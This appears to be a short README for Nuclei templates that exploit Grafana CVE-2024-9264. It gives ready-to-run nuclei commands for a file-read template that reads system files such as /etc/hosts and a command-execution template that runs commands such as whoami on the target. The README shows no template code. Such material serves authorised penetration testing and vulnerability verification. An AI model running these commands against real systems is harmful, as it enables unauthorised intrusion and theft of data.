# Grafana

## CVE-2024-9264

### LFI 

- file: [grafana-cve-2024-9264-lfi.yaml](./grafana-cve-2024-9264-lfi.yaml)

The `grafana-cve-2024-9264-lfi.yaml` template leverages the vulnerability to exfiltrate files from the target.

Please note that you may need to escape slashes when specifying the path of the file you want to read in the rfile variable to prevent Nuclei from trying to open the file on your system.

```sh
nuclei -u <URL> -t ./grafana-cve-2024-9264-lfi.yaml -var username=<USER> -var password=<PWD> -var rfile="\/etc\/hosts"
```

#### RCE

- file: [grafana-cve-2024-9264-rce.yaml](./grafana-cve-2024-9264-rce.yaml)

The `grafana-cve-2024-9264-rce.yaml` template leverages the vulnerability to run commands the target.

```sh
nuclei -u <URL> -t ./grafana-cve-2024-9264-rce.yaml -var username=<USER> -var password=<PWD> -var command=whoami
```
